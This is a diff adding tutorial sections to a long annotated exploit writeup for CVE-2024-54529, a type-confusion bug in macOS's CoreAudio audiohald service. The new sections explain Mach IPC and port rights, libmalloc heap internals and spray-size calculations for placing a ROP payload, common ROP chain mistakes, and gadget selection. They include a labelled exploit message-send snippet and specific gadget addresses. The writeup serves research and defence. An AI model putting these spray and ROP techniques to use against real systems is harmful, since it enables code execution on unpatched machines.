@@ -78,6 +78,15 @@
  *           - Detection opportunities for defenders
  *           - Generalizable lessons for future research
  *
+ *   PART 16: ARM64 EXPLOITATION AND POINTER AUTHENTICATION (PAC)
+ *           - PAC fundamentals: hardware-level implementation
+ *           - PAC key types: A keys vs B keys (IA, IB, DA, DB)
+ *           - What gets signed on macOS/iOS
+ *           - Theoretical bypass approaches (signing gadgets, oracles, etc.)
+ *           - CVE-2024-54529 on ARM64: what changes
+ *           - Why Apple Silicon is harder (but not impossible)
+ *           - Research references for PAC exploitation
+ *
  *   APPENDIX A: NOTES FOR ELITE RESEARCHERS
  *           - Open problems and research directions
  *           - Type confusion detection frameworks
@@ -89,6 +98,138 @@
  *           - Sergei Glazunov: dyld extraction, HALS symbols, gadgets
  *           - Clement Lecigne: log monitoring, IOCs, detection
  *           - Brandon Falk: heap analysis, vmmap, memory layout
+ *
+ * =============================================================================
+ * HOW TO READ THIS DOCUMENT: READER PATHS
+ * =============================================================================
+ *
+ * This document serves multiple audiences. Choose your path based on your
+ * background and goals:
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │                    COMPLETE BEGINNERS                                   │
+ * │                (No exploit development experience)                       │
+ * ├─────────────────────────────────────────────────────────────────────────┤
+ * │                                                                         │
+ * │   RECOMMENDED PATH:                                                     │
+ * │                                                                         │
+ * │   1. Start with PART 0: Vulnerability Research Foundations             │
+ * │      - Understand WHY we do this work                                  │
+ * │      - Learn attack surface analysis concepts                          │
+ * │                                                                         │
+ * │   2. Read PART -1 sections 1.1 through 1.4 (XNU basics)               │
+ * │      - Get the kernel context without drowning in detail               │
+ * │      - Focus on the diagrams, skim the code                           │
+ * │                                                                         │
+ * │   3. Read the first-principles explanations in PART 3                  │
+ * │      - Type confusion "Dog vs BankAccount" analogy                     │
+ * │      - "Memory is just bytes" foundation                               │
+ * │      - Skip code details on first pass                                 │
+ * │                                                                         │
+ * │   4. Try BEGINNER exercises in APPENDIX B                              │
+ * │      - Run the commands yourself                                       │
+ * │      - Observe the outputs                                             │
+ * │      - Learning happens by DOING                                       │
+ * │                                                                         │
+ * │   GOAL: Build intuition before diving into technical depth             │
+ * │                                                                         │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │                   INTERMEDIATE RESEARCHERS                              │
+ * │             (Some systems/security experience)                          │
+ * ├─────────────────────────────────────────────────────────────────────────┤
+ * │                                                                         │
+ * │   RECOMMENDED PATH:                                                     │
+ * │                                                                         │
+ * │   1. PART -1: Full XNU architecture for macOS context                  │
+ * │      - Mach IPC is fundamental to understanding the attack             │
+ * │                                                                         │
+ * │   2. PART 5: CoreAudio architecture deep dive                          │
+ * │      - HALS object hierarchy is where the bug lives                    │
+ * │                                                                         │
+ * │   3. PART 6: Bug hunting methodology                                   │
+ * │      - This is transferable knowledge for your own research            │
+ * │                                                                         │
+ * │   4. APPENDIX B: Reproduce the experiments yourself                    │
+ * │      - Understanding deepens through hands-on work                     │
+ * │                                                                         │
+ * │   GOAL: Understand the methodology to apply to other targets           │
+ * │                                                                         │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │                    EXPERT RESEARCHERS                                   │
+ * │            (Looking for variant analysis / new research)                │
+ * ├─────────────────────────────────────────────────────────────────────────┤
+ * │                                                                         │
+ * │   RECOMMENDED PATH:                                                     │
+ * │                                                                         │
+ * │   1. Jump to PART 3, Section K.2: Root Cause Analysis                  │
+ * │      - Understand the exact vulnerable pattern                         │
+ * │                                                                         │
+ * │   2. PART 7: Defensive Lessons and Patching                            │
+ * │      - 6 vulnerable handlers, variant analysis patterns                │
+ * │      - Prior art comparison                                            │
+ * │                                                                         │
+ * │   3. APPENDIX A: Notes for Elite Researchers                           │
+ * │      - Open problems and research directions                           │
+ * │                                                                         │
+ * │   4. PART 8: ARM64/PAC (theoretical exploitation)                      │
+ * │      - Current research frontier                                       │
+ * │                                                                         │
+ * │   GOAL: Find similar bugs or advance the state of the art              │
+ * │                                                                         │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │                    DETECTION ENGINEERS                                  │
+ * │                    (Blue team focus)                                    │
+ * ├─────────────────────────────────────────────────────────────────────────┤
+ * │                                                                         │
+ * │   RECOMMENDED PATH:                                                     │
+ * │                                                                         │
+ * │   1. PART 7: Detection opportunities section                           │
+ * │      - YARA rules for exploit artifacts                                │
+ * │      - Log monitoring strategies                                       │
+ * │      - IOC extraction                                                  │
+ * │                                                                         │
+ * │   2. APPENDIX B: Experiments 8-10                                      │
+ * │      - Set up real-time monitoring                                     │
+ * │      - Understand normal vs anomalous behavior                         │
+ * │                                                                         │
+ * │   3. Part 0.2: Attack surface analysis                                 │
+ * │      - Understand defender's perspective                               │
+ * │                                                                         │
+ * │   GOAL: Detect and prevent this class of attacks                       │
+ * │                                                                         │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │                         STUDENTS                                        │
+ * │                 (Academic / learning context)                           │
+ * ├─────────────────────────────────────────────────────────────────────────┤
+ * │                                                                         │
+ * │   RECOMMENDED PATH:                                                     │
+ * │                                                                         │
+ * │   1. Read the document LINEARLY from PART -1 through PART 7            │
+ * │      - Don't skip sections                                             │
+ * │      - Take notes on concepts you don't understand                     │
+ * │      - Look up unfamiliar terms                                        │
+ * │                                                                         │
+ * │   2. Do ALL exercises in APPENDIX B                                    │
+ * │      - Every single one, at every difficulty level                     │
+ * │      - Document your observations                                      │
+ * │                                                                         │
+ * │   3. Reproduce the entire analysis on your own machine                 │
+ * │      - Understanding = ability to reproduce                            │
+ * │                                                                         │
+ * │   4. Challenge: Attempt the EXPERT exercises                           │
+ * │      - Even partial progress teaches valuable lessons                  │
+ * │                                                                         │
+ * │   GOAL: Deep understanding through comprehensive study + practice      │
+ * │                                                                         │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * =============================================================================
  * ⚠️  CRITICAL LIMITATION: PAC / Apple Silicon (arm64e)
@@ -128,6 +269,17 @@
  * PART -1: XNU KERNEL ARCHITECTURE DEEP DIVE
  * =============================================================================
  * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Intermediate                                                  │
+ * │ PREREQUISITES: Basic OS concepts, process/thread understanding          │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • XNU hybrid architecture                                             │
+ * │   • Mach IPC                                                            │
+ * │   • zones                                                               │
+ * │   • tasks                                                               │
+ * │   • MIG                                                                 │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * Written from the perspective of a senior Apple XNU kernel engineer.
  *
@@ -458,6 +610,257 @@
  *   osfmk/ipc/ipc_kmsg.c     - Kernel message handling
  *   osfmk/kern/ipc_tt.c      - Thread/Task IPC
  *   bsd/kern/kern_credential.c - Audit token creation
+ *
+ * -----------------------------------------------------------------------------
+ * -1.2.3 mach_msg() PARAMETER DEEP DIVE
+ * -----------------------------------------------------------------------------
+ *
+ * The mach_msg() function is the heart of Mach IPC. Let's examine every parameter:
+ *
+ *   mach_msg_return_t mach_msg(
+ *       mach_msg_header_t *msg,        // Message buffer
+ *       mach_msg_option_t option,      // Send/receive options
+ *       mach_msg_size_t send_size,     // Size if sending
+ *       mach_msg_size_t rcv_size,      // Buffer size if receiving
+ *       mach_port_name_t rcv_name,     // Port to receive on
+ *       mach_msg_timeout_t timeout,    // Timeout in ms
+ *       mach_port_name_t notify        // Notification port
+ *   );
+ *
+ * PARAMETER 1: mach_msg_header_t *msg
+ * ------------------------------------
+ * The message buffer containing header and optional body. Must be properly
+ * aligned (natural alignment). For sending, contains the outgoing message.
+ * For receiving, this buffer will be filled with the incoming message.
+ *
+ *   typedef struct {
+ *       mach_msg_bits_t       msgh_bits;         // Encodes port rights + complex bit
+ *       mach_msg_size_t       msgh_size;         // Total message size
+ *       mach_port_t           msgh_remote_port;  // Destination (send) or source (recv)
+ *       mach_port_t           msgh_local_port;   // Reply port (send) or dest (recv)
+ *       mach_port_name_t      msgh_voucher_port; // QoS voucher
+ *       mach_msg_id_t         msgh_id;           // Message identifier (MIG routine)
+ *   } mach_msg_header_t;
+ *
+ * PARAMETER 2: mach_msg_option_t option
+ * --------------------------------------
+ * Bitmask controlling operation mode. Key flags:
+ *
+ *   SEND FLAGS:
+ *     MACH_SEND_MSG         (0x00000001) - Perform send operation
+ *     MACH_SEND_TIMEOUT     (0x00000010) - Use timeout for send
+ *     MACH_SEND_NOTIFY      (0x00000020) - Request send-possible notification
+ *     MACH_SEND_OVERRIDE    (0x00000040) - Override QoS for this message
+ *     MACH_SEND_TRAILER     (0x00000100) - Include trailer in send
+ *     MACH_SEND_SYNC_USE_THRPRI (0x00800000) - Use thread priority for sync IPC
+ *
+ *   RECEIVE FLAGS:
+ *     MACH_RCV_MSG          (0x00000002) - Perform receive operation
+ *     MACH_RCV_TIMEOUT      (0x00000100) - Use timeout for receive
+ *     MACH_RCV_NOTIFY       (0x00000200) - Request notification on no message
+ *     MACH_RCV_LARGE        (0x00000400) - Allow large inline messages
+ *     MACH_RCV_VOUCHER      (0x00000800) - Receive voucher port
+ *     MACH_RCV_TRAILER_TYPE(x) - Specify trailer type to receive
+ *     MACH_RCV_TRAILER_ELEMENTS(x) - Number of trailer elements
+ *
+ *   COMMON COMBINATIONS:
+ *     MACH_SEND_MSG | MACH_SEND_TIMEOUT           - Send with timeout
+ *     MACH_SEND_MSG | MACH_RCV_MSG                - Send then receive (RPC pattern)
+ *     MACH_RCV_MSG | MACH_RCV_TIMEOUT             - Receive with timeout
+ *     MACH_RCV_MSG | MACH_RCV_TRAILER_AUDIT       - Receive with audit trailer
+ *
+ * PARAMETER 3: mach_msg_size_t send_size
+ * ---------------------------------------
+ * For MACH_SEND_MSG: Total size of message including header.
+ * Must be >= sizeof(mach_msg_header_t) (24 bytes).
+ * For complex messages, includes body and all descriptors.
+ * For receive-only operations: Set to 0.
+ *
+ * PARAMETER 4: mach_msg_size_t rcv_size
+ * --------------------------------------
+ * For MACH_RCV_MSG: Size of receive buffer.
+ * If incoming message is larger: MACH_RCV_TOO_LARGE error.
+ * With MACH_RCV_LARGE: Kernel tells you actual size needed.
+ * For send-only operations: Set to 0.
+ *
+ * PARAMETER 5: mach_port_name_t rcv_name
+ * ---------------------------------------
+ * Port to receive messages on. Must hold receive right.
+ * For send-only: Set to MACH_PORT_NULL.
+ * Kernel blocks until message arrives or timeout.
+ *
+ * PARAMETER 6: mach_msg_timeout_t timeout
+ * ----------------------------------------
+ * Timeout in milliseconds. Only used if MACH_SEND_TIMEOUT or
+ * MACH_RCV_TIMEOUT is set.
+ *   0 = No wait (return immediately if can't send/receive)
+ *   MACH_MSG_TIMEOUT_NONE = Wait forever
+ *   Other values = Wait up to N milliseconds
+ *
+ * PARAMETER 7: mach_port_name_t notify
+ * -------------------------------------
+ * Notification port for async notifications. Used with MACH_SEND_NOTIFY
+ * or MACH_RCV_NOTIFY. Set to MACH_PORT_NULL when not using notifications.
+ *
+ * RETURN VALUES:
+ * --------------
+ *   MACH_MSG_SUCCESS           (0x00000000) - Operation completed
+ *   MACH_SEND_INVALID_DEST     (0x10000003) - Bad destination port
+ *   MACH_SEND_TIMED_OUT        (0x10000004) - Send timed out
+ *   MACH_SEND_INVALID_RIGHT    (0x10000007) - Don't have send right
+ *   MACH_SEND_INVALID_MEMORY   (0x1000000C) - Bad OOL memory pointer
+ *   MACH_RCV_INVALID_NAME      (0x10004002) - Bad receive port
+ *   MACH_RCV_TIMED_OUT         (0x10004003) - Receive timed out
+ *   MACH_RCV_TOO_LARGE         (0x10004004) - Message too large for buffer
+ *   MACH_RCV_PORT_DIED         (0x10004006) - Port was destroyed
+ *
+ * EXPLOIT CODE EXAMPLE:
+ *
+ *   // Send message to audiohald with 5 second timeout
+ *   mach_msg_return_t kr = mach_msg(
+ *       &msg->header,                    // Our crafted message
+ *       MACH_SEND_MSG | MACH_SEND_TIMEOUT, // Send with timeout
+ *       sizeof(our_message_struct),      // Total message size
+ *       0,                               // Not receiving
+ *       MACH_PORT_NULL,                  // No receive port
+ *       5000,                            // 5 second timeout
+ *       MACH_PORT_NULL                   // No notification port
+ *   );
+ *   if (kr != MACH_MSG_SUCCESS) {
+ *       // Handle error (timeout, invalid port, etc.)
+ *   }
+ *
+ * -----------------------------------------------------------------------------
+ * -1.2.4 NDR (NETWORK DATA REPRESENTATION) ENCODING
+ * -----------------------------------------------------------------------------
+ *
+ * MIG-generated messages include an NDR record for cross-architecture
+ * compatibility. This 8-byte header describes data encoding:
+ *
+ *   typedef struct {
+ *       unsigned char       mig_vers;      // MIG version (always 0)
+ *       unsigned char       if_vers;       // Interface version (always 0)
+ *       unsigned char       reserved1;     // Padding (0)
+ *       unsigned char       mig_encoding;  // Encoding format
+ *       unsigned char       int_rep;       // Integer representation
+ *       unsigned char       char_rep;      // Character representation
+ *       unsigned char       float_rep;     // Float representation
+ *       unsigned char       reserved2;     // Padding (0)
+ *   } NDR_record_t;
+ *
+ * STANDARD NDR RECORD (little-endian, as used on macOS):
+ *
+ *   NDR_record_t NDR_record = {
+ *       0,                                  // mig_vers
+ *       0,                                  // if_vers
+ *       0,                                  // reserved1
+ *       0,                                  // mig_encoding (NDR_LOCAL_ENCODING)
+ *       1,                                  // int_rep (NDR_LITTLE_ENDIAN)
+ *       0,                                  // char_rep (NDR_ASCII_CHAR)
+ *       0,                                  // float_rep (NDR_IEEE_FLOAT)
+ *       0                                   // reserved2
+ *   };
+ *
+ * BYTE REPRESENTATION: 00 00 00 00 01 00 00 00
+ *
+ * WHERE IT APPEARS:
+ *   In MIG messages, NDR_record immediately follows the message header
+ *   and precedes the actual parameters:
+ *
+ *   ┌────────────────────────────────────────────────────────────────────────┐
+ *   │ mach_msg_header_t (24 bytes)                                          │
+ *   ├────────────────────────────────────────────────────────────────────────┤
+ *   │ NDR_record_t (8 bytes): 00 00 00 00 01 00 00 00                       │
+ *   ├────────────────────────────────────────────────────────────────────────┤
+ *   │ Parameters (MIG routine specific)                                     │
+ *   └────────────────────────────────────────────────────────────────────────┘
+ *
+ * WHY IT MATTERS FOR EXPLOITATION:
+ *   - MIG handlers expect NDR record at fixed offset
+ *   - Incorrect NDR can cause parameter misalignment
+ *   - Most exploits can use the default macOS NDR_record
+ *   - Fuzzing the NDR fields rarely finds bugs (well-validated)
+ *
+ * -----------------------------------------------------------------------------
+ * -1.2.5 PORT RIGHT TRANSFER MECHANICS
+ * -----------------------------------------------------------------------------
+ *
+ * Mach messages can transfer PORT RIGHTS between tasks. This is fundamental
+ * to capability-based security and service discovery.
+ *
+ * TYPES OF PORT RIGHTS:
+ *
+ *   MACH_PORT_RIGHT_SEND       - Can send messages (multiple tasks can hold)
+ *   MACH_PORT_RIGHT_RECEIVE    - Can receive messages (exactly one holder)
+ *   MACH_PORT_RIGHT_SEND_ONCE  - Can send exactly one message, then consumed
+ *   MACH_PORT_RIGHT_PORT_SET   - Can receive from multiple ports
+ *   MACH_PORT_RIGHT_DEAD_NAME  - Port was destroyed (notification only)
+ *
+ * HOW RIGHTS ARE TRANSFERRED IN MESSAGES:
+ *
+ *   When sending a port in a message, you specify the DISPOSITION:
+ *
+ *   typedef unsigned int mach_msg_type_name_t;
+ *
+ *   MACH_MSG_TYPE_MOVE_RECEIVE   (16) - Transfer receive right (sender loses it)
+ *   MACH_MSG_TYPE_MOVE_SEND      (17) - Transfer send right (sender loses it)
+ *   MACH_MSG_TYPE_MOVE_SEND_ONCE (18) - Transfer send-once (sender loses it)
+ *   MACH_MSG_TYPE_COPY_SEND      (19) - Copy send right (sender keeps it)
+ *   MACH_MSG_TYPE_MAKE_SEND      (20) - Create send from receive (receive holder)
+ *   MACH_MSG_TYPE_MAKE_SEND_ONCE (21) - Create send-once from receive
+ *
+ * PORT DESCRIPTOR STRUCTURE:
+ *
+ *   typedef struct {
+ *       mach_port_t                 name;        // Port name in sender's space
+ *       mach_msg_size_t             pad1;        // Padding for alignment
+ *       unsigned int                pad2 : 16;
+ *       mach_msg_type_name_t        disposition : 8;  // How to transfer
+ *       mach_msg_descriptor_type_t  type : 8;         // = MACH_MSG_PORT_DESCRIPTOR
+ *   } mach_msg_port_descriptor_t;
+ *
+ * KERNEL PROCESSING OF PORT TRANSFERS:
+ *
+ *   1. Sender builds message with port descriptor
+ *   2. Kernel's ipc_kmsg_copyin_port_descriptor():
+ *      - Validates sender holds the specified right
+ *      - For MOVE: Removes right from sender's IPC space
+ *      - For COPY: Increments send right count
+ *      - For MAKE_SEND: Creates new send right from receive
+ *      - Stores kernel port pointer in ipc_kmsg
+ *
+ *   3. When receiver calls mach_msg() with MACH_RCV_MSG:
+ *      - Kernel's ipc_kmsg_copyout_port_descriptor():
+ *      - Inserts port into receiver's IPC space
+ *      - Assigns a new port NAME in receiver's namespace
+ *      - Receiver sees the new port name in the descriptor
+ *
+ * EXAMPLE: BOOTSTRAP PORT DISCOVERY
+ *
+ *   // Get send right to a system service
+ *   mach_port_t service_port;
+ *   kern_return_t kr = bootstrap_look_up(
+ *       bootstrap_port,           // Special port with send right to launchd
+ *       "com.apple.audio.audiohald",
+ *       &service_port             // Receives SEND RIGHT to audiohald
+ *   );
+ *   // Now we can send messages to audiohald!
+ *
+ * SECURITY IMPLICATION:
+ *
+ *   Port rights are CAPABILITIES. Possessing a send right to a service
+ *   means you can communicate with it. This is why sandbox profiles
+ *   control which service ports a process can look up via bootstrap.
+ *
+ *   For CVE-2024-54529: The sandboxed process has legitimate send rights
+ *   to audiohald (needed for audio playback). The vulnerability is that
+ *   audiohald trusts object IDs from ANY client with send rights.
+ *
+ * XNU SOURCE REFERENCES:
+ *   osfmk/ipc/ipc_kmsg.c:ipc_kmsg_copyin_port_descriptor()
+ *   osfmk/ipc/ipc_kmsg.c:ipc_kmsg_copyout_port_descriptor()
+ *   osfmk/ipc/ipc_right.c - Port right management
+ *   osfmk/mach/message.h - Descriptor type definitions
  *
  * -----------------------------------------------------------------------------
  * -1.3 ZONE ALLOCATORS: WHERE KERNEL OBJECTS LIVE
@@ -1207,6 +1610,15 @@
  * PART 0: VULNERABILITY RESEARCH FOUNDATIONS
  * =============================================================================
  * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Beginner                                                      │
+ * │ PREREQUISITES: None                                                     │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • Why vuln research matters                                           │
+ * │   • Attack surface analysis                                             │
+ * │   • Target selection                                                    │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * This section provides the foundational knowledge needed to understand
  * vulnerability research from first principles. Before we dive into the
@@ -3908,6 +4320,50 @@
  * This is why heap spray works: even if each individual allocation
  * is probabilistic, spray ENOUGH and success is nearly guaranteed.
  *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * COMMON HEAP SPRAY MISTAKES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * Learning from others' failures saves you time. Here are common heap spray
+ * mistakes that waste hours of debugging:
+ *
+ * MISTAKE 1: WRONG SIZE CLASS
+ * ───────────────────────────
+ *   Problem: Spraying 1024-byte allocations when target is 1152 bytes
+ *   Result: Your data goes to TINY zone, target goes to SMALL zone
+ *   Fix: Calculate exact allocation size including headers/alignment
+ *
+ *   Engine object = 1152 bytes → SMALL zone
+ *   Your spray strings must also land in SMALL zone!
+ *
+ * MISTAKE 2: NOT CREATING HOLES
+ * ─────────────────────────────
+ *   Problem: Spray is contiguous, target allocates fresh memory
+ *   Result: Target never lands in your controlled data
+ *   Fix: Free some spray allocations to create "holes"
+ *
+ *   Pattern: Allocate → Free every Nth → Allocate target
+ *
+ * MISTAKE 3: INSUFFICIENT VOLUME
+ * ──────────────────────────────
+ *   Problem: Not enough allocations to fill the zone
+ *   Result: Low probability of target landing in spray
+ *   Fix: Calculate zone size, spray enough to dominate
+ *
+ *   4MB zone / 1536 byte allocations = ~2700 allocations needed
+ *
+ * MISTAKE 4: RACE CONDITIONS
+ * ──────────────────────────
+ *   Problem: Target allocates before spray completes
+ *   Result: Spray hasn't filled the zone yet
+ *   Fix: Synchronize spray completion before triggering allocation
+ *
+ * MISTAKE 5: IGNORING HEAP ENTROPY
+ * ────────────────────────────────
+ *   Problem: Assuming heap is deterministic
+ *   Result: Exploit works on your machine, fails elsewhere
+ *   Fix: Spray MORE than theoretically needed, accept probabilistic success
+ *
  * THE PROGRAM'S STACK VS OUR HEAP:
  * ────────────────────────────────
  *
@@ -6347,6 +6803,153 @@ int main(int argc, char *argv[]) {
  *   remains in the freed slots until overwritten.
  *
  * -----------------------------------------------------------------------------
+ * LIBMALLOC MAGAZINE INTERNALS
+ * -----------------------------------------------------------------------------
+ *
+ * macOS libmalloc uses a "magazine" allocator inspired by Hoard.
+ * Understanding it is key to reliable heap exploitation.
+ *
+ * ZONE DECISION TREE:
+ *   allocation_size <= 256 bytes?  -> NANO zone (if enabled)
+ *   allocation_size <= 1008 bytes? -> TINY zone
+ *   allocation_size <= 127KB?      -> SMALL zone  <-- Engine (1152 bytes) goes here!
+ *   allocation_size <= 1MB?        -> MEDIUM zone (macOS 11+)
+ *   larger?                        -> LARGE zone (mmap'd directly)
+ *
+ * MAGAZINE STRUCTURE (from libmalloc/src/magazine_malloc.c):
+ *
+ *   typedef struct magazine_s {
+ *       // Cache of recently freed blocks (LIFO)
+ *       void *mag_last_free;              // Hot cache - first check on alloc
+ *       region_t *mag_last_free_rgn;      // Region of last freed block
+ *
+ *       // Per-magazine statistics
+ *       size_t mag_num_objects;           // Total objects managed
+ *       size_t mag_num_bytes_in_objects;  // Total bytes allocated
+ *
+ *       // Region management
+ *       region_t *firstRegion;            // Linked list of regions
+ *       region_t *lastRegion;
+ *
+ *       // Locking
+ *       _malloc_lock_s magazine_lock;     // Per-magazine lock
+ *
+ *       // ... additional fields for debugging/tuning
+ *   } magazine_t;
+ *
+ *   MAGAZINE ARRAY (one per CPU core + depot):
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │ magazine[0] - CPU 0 magazine                                           │
+ *   │ magazine[1] - CPU 1 magazine                                           │
+ *   │ magazine[2] - CPU 2 magazine                                           │
+ *   │ ...                                                                    │
+ *   │ magazine[N] - CPU N magazine                                           │
+ *   │ magazine[N+1] - DEPOT (overflow storage, rarely accessed)              │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * REGION STRUCTURE:
+ *
+ *   typedef struct region_s {
+ *       // Region header (at start of mmap'd area)
+ *       magazine_t *owner;                // Owning magazine
+ *       region_t *next;                   // Linked list
+ *
+ *       // Bitmap tracking free/allocated slots
+ *       uint32_t *bitmap;                 // 1 bit per slot
+ *       uint32_t num_slots;               // Total slots in region
+ *       uint32_t num_allocated;           // Currently allocated
+ *
+ *       // Region boundaries
+ *       void *region_start;               // Start of allocatable area
+ *       void *region_end;                 // End of region
+ *   } region_t;
+ *
+ *   REGION LAYOUT (SMALL zone, 4MB region):
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │ region_t header (~64 bytes)                                            │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │ Bitmap area (1 bit per slot)                                           │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │ Slot 0: [1536 bytes] - allocated or free                               │
+ *   │ Slot 1: [1536 bytes]                                                   │
+ *   │ Slot 2: [1536 bytes]                                                   │
+ *   │ ... (~2730 slots for 1536-byte quantum)                               │
+ *   │ Slot N: [1536 bytes]                                                   │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * MATHEMATICAL SPRAY CALCULATION:
+ *
+ *   Target allocation: 1152 bytes (ROP payload size)
+ *   Zone: SMALL (1024 <= size <= 127KB)
+ *   Quantum: 512 bytes (SMALL zone granularity)
+ *   Actual allocation: ceil(1152/512) * 512 = 1536 bytes
+ *
+ *   SMALL region size: 4MB (0x400000 bytes)
+ *   Slots per region: 4MB / 1536 = 2730 slots (approximately)
+ *
+ *   To completely fill one region:
+ *     allocations_needed = 2730
+ *
+ *   To fill N regions (increasing coverage):
+ *     allocations_needed = N * 2730
+ *
+ *   PROBABILITY CALCULATION:
+ *
+ *   Given:
+ *     - Total slots in target region: S = 2730
+ *     - Slots we control via spray: C
+ *     - Target object allocations (Engine): T = 1
+ *
+ *   Probability that Engine lands in our controlled memory:
+ *     P(hit) = C / S
+ *
+ *   For 90% reliability with single target:
+ *     C/S >= 0.90
+ *     C >= 0.90 * 2730 = 2457 allocations
+ *
+ *   With multiple holes (spray, free some, trigger allocation):
+ *     If we spray C allocations, free H of them:
+ *     P(hit) = H / (H + available_slots)
+ *
+ *   PRACTICAL SPRAY QUANTITIES:
+ *
+ *     Conservative:  5000 allocations (~1.8 regions worth)
+ *     Moderate:     10000 allocations (~3.7 regions worth)
+ *     Aggressive:   50000 allocations (~18 regions worth)
+ *
+ *   Memory consumption: 50000 * 1536 = ~77MB in audiohald
+ *
+ * ALLOCATION TIMING CONSIDERATIONS:
+ *
+ *   libmalloc is designed for performance, not security:
+ *
+ *   1. LIFO freelist: Last freed = first reallocated
+ *      -> Free in specific order, trigger allocation immediately
+ *
+ *   2. Magazine locality: Same CPU = same magazine
+ *      -> Exploit should pin to single CPU for predictability
+ *
+ *   3. Region reuse: Freed slots recycled before new region
+ *      -> Fill region, create holes, allocations land in holes
+ *
+ * WHY THIS MATTERS FOR CVE-2024-54529:
+ *
+ *   The Engine object is ~1152 bytes. Our heap spray also uses 1152-byte
+ *   strings. Both land in the SAME size class (1536-byte quantum).
+ *
+ *   When we:
+ *   1. Spray thousands of CFStrings containing ROP payload
+ *   2. Free some of them (holes created)
+ *   3. Trigger Engine object creation
+ *
+ *   The Engine object will be allocated from the SAME freelist where
+ *   our CFString backing stores were just freed. The Engine object's
+ *   memory will contain RESIDUE from our payload (uninitialized memory).
+ *
+ *   Combined with the type confusion bug, this residue becomes our
+ *   controlled vtable pointer, leading to code execution.
+ *
+ * -----------------------------------------------------------------------------
  * B.3 HEAP SPRAY IMPLEMENTATION IN THIS EXPLOIT
  * -----------------------------------------------------------------------------
  *
@@ -7206,6 +7809,53 @@ int main(int argc, char *argv[]) {
  *   exploit/build_rop.py:78    - rop[0x168:0x170] = p64(STACK_PIVOT_GADGET)
  *   exploit/exploit.mm:1436    - trigger_vulnerability() function
  *   helpers/message_ids.h:80   - XIOContext_Fetch_Workgroup_Port = 1010059
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * COMMON ROP CHAIN MISTAKES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * MISTAKE 1: STACK ALIGNMENT
+ * ──────────────────────────
+ *   Problem: RSP not 16-byte aligned when calling functions
+ *   Result: Mysterious crashes in SSE instructions (movaps, etc.)
+ *   Fix: Add padding "ret" gadgets to adjust alignment
+ *
+ *   Check: RSP % 16 == 0 before any function call
+ *
+ * MISTAKE 2: REGISTER CLOBBERING
+ * ──────────────────────────────
+ *   Problem: Gadget B clobbers register set by gadget A
+ *   Result: Wrong argument values at syscall
+ *   Fix: Build chain BACKWARDS from syscall, track dependencies
+ *
+ *   Example: pop rdi ; xor rax, rax ; ret CLOBBERS rax!
+ *
+ * MISTAKE 3: FORGETTING "pop rbp" SIDE EFFECTS
+ * ────────────────────────────────────────────
+ *   Problem: Useful gadget has "pop rbp" in the middle
+ *   Result: Stack misaligned, next gadget address corrupted
+ *   Fix: Add 8-byte padding for each unexpected pop
+ *
+ * MISTAKE 4: WRONG ENDIANNESS
+ * ───────────────────────────
+ *   Problem: Packing addresses in big-endian on little-endian system
+ *   Result: Completely wrong addresses, immediate crash
+ *   Fix: Use struct.pack("<Q", addr) for little-endian 64-bit
+ *
+ * MISTAKE 5: SYSCALL NUMBER CONFUSION (macOS)
+ * ───────────────────────────────────────────
+ *   Problem: Using raw syscall number without class prefix
+ *   Result: Wrong syscall invoked or kernel panic
+ *   Fix: BSD syscalls need 0x2000000 prefix
+ *
+ *   open() = 5 → 0x2000005
+ *   write() = 4 → 0x2000004
+ *
+ * MISTAKE 6: ASLR ASSUMPTIONS
+ * ───────────────────────────
+ *   Problem: Hardcoding addresses that vary per boot
+ *   Result: Works once, fails after reboot
+ *   Fix: Either leak addresses or use per-boot calculation
  *
  * ═══════════════════════════════════════════════════════════════════════════
  *
@@ -8863,6 +9513,680 @@ int main(int argc, char *argv[]) {
  *   Example with ROPgadget:
  *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "pop rdi"
  *     0x00001234 : pop rdi ; ret
+ *
+ * -----------------------------------------------------------------------------
+ * L.2.1 GADGET SELECTION METHODOLOGY: WHY THESE 10 GADGETS?
+ * -----------------------------------------------------------------------------
+ *
+ * ROPgadget found 26,923 gadgets in CoreAudio alone. We only need ~10.
+ * How do you choose? Here's the systematic approach:
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────────┐
+ * │ GADGET #1: STACK_PIVOT_GADGET (0x7ff810b908a4)                              │
+ * │ Instruction: xchg rsp, rax ; xor edx, edx ; ret                             │
+ * └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ *   REQUIREMENT:
+ *     Need to redirect execution flow by moving the stack pointer to memory
+ *     we control. Without this, we can't chain gadgets - we'd just execute
+ *     one gadget and crash.
+ *
+ *   SEARCH COMMAND:
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "xchg.*rsp.*rax"
+ *     $ ROPgadget --binary /usr/lib/libSystem.B.dylib | grep "mov rsp.*rax"
+ *
+ *   CANDIDATES FOUND: ~15 matches
